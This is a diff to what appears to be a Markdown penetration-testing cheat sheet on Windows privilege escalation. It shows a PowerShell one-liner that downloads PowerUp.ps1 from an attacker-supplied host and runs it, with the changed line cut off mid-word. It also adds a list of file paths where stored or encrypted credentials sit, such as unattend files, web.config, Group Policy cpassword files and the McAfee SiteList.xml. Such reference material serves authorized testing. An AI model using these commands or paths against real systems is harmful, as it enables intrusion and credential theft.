@@ -225,7 +225,34 @@ Use: https://github.com/ohpe/juicy-potato
 * PowerUP
    * Config: add to the last line the "Invoke-AllChecks"
    * Download and run PowerUp:
-     ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/PowerUp.ps1') | powershell -noprofile -
+     ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/PowerUp.ps1') | powershell -noprofi
+     
+ * Stored Creadentials:
+   * Stored as plaintext or base64
+     * C:\unattend.xml
+     * C:\Windows\Panther\Unattend.xml
+     * C:\Windows\Panther\Unattend\Unattend.xml
+     * C:\Windows\system32\sysprep.inf
+     * C:\Windows\system32\sysprep\sysprep.xml
+     
+   * If system is running an IIS web server the web.config file:
+     * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+     * C:\inetpub\wwwroot\web.config
+     
+   * Local administrators passwords can also retrieved via the Group Policy Preferences:
+     * C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
+     * \\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
+   
+   * Except of the Group.xml file the cpassword attribute can be found in other policy preference files as well such as:
+     * Services\Services.xml
+     * ScheduledTasks\ScheduledTasks.xml
+     * Printers\Printers.xml
+     * Drives\Drives.xml
+     * DataSources\DataSources.xml
+     
+   * Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:
+     * %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml 
+
 
 ## MSFVENOM
 ### EXE
